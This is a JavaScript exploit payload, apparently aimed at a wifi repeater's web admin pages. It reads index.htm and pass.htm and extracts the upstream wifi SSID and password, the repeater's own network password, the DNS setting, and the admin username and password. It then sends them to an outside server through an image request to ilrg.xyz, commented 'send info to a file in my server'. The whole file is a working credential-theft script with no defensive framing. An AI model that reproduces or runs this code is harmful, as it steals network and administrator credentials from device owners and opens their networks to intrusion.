var rawFile = new XMLHttpRequest();
rawFile.open(this.method, this.url, true);
rawFile.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
rawFile.setRequestHeader("Access-Control-Allow-Origin", "*");

rawFile.open("GET", "http://myrepeater.net/index.htm", false);
rawFile.send();

var response = rawFile.responseText;

var apCliSsid = response.indexOf("0x04df0200") ;
var cliSsid = response.slice(apCliSsid,apCliSsid+30).match(/'([^']+)'/)[1]; //selects the wifi network that the repeater is connected to

var apCliWPAPSK = response.indexOf("0x04de0200") ;
var cliWPAPSK = response.slice(apCliWPAPSK,apCliWPAPSK+30).match(/'([^']+)'/)[1]; //wifi network password that the repeater is connected to

var ssid = response.indexOf("0x043c0200") ;
var bssid = response.slice(ssid,ssid+30).match(/'([^']+)'/)[1]; //repeater wifi network ssid

var pass = response.indexOf("0x049a0200") ;
var pass1 = response.slice(pass,pass+30).match(/'([^']+)'/)[1]; //repeater wifi network password

var dns = response.indexOf("0x0e020301");
var dns1= response.slice(dns,dns+30).match(/'([^']+)'/)[1]; //DNS 

data = "Wifi SSID: " + cliSsid + "  Wifi pass: " + cliWPAPSK +  "  AP SSID: " + bssid +  "  AP pass: " + pass1 +  "  DNS: " + dns1 + "  ";

rawFile.open("GET", "http://myrepeater.net/pass.htm", false);
rawFile.send();

var response2 = rawFile.responseText;

var username = response2.indexOf("0x010b0200") ;
var user = response2.slice(username,username+30).match(/'([^']+)'/)[1]; //router user 

var oldPasswd = response2.indexOf("0x01010200") ;
var oldPasswd1 = response2.slice(oldPasswd,oldPasswd+30).match(/'([^']+)'/)[1]; //router pass

data2 = "Repeater username: " + user + "  Repeater password: " + oldPasswd1;

data3 = data + data2;

new Image().src="https://ilrg.xyz/infos.php?data="+data3 //send info to a file in my server
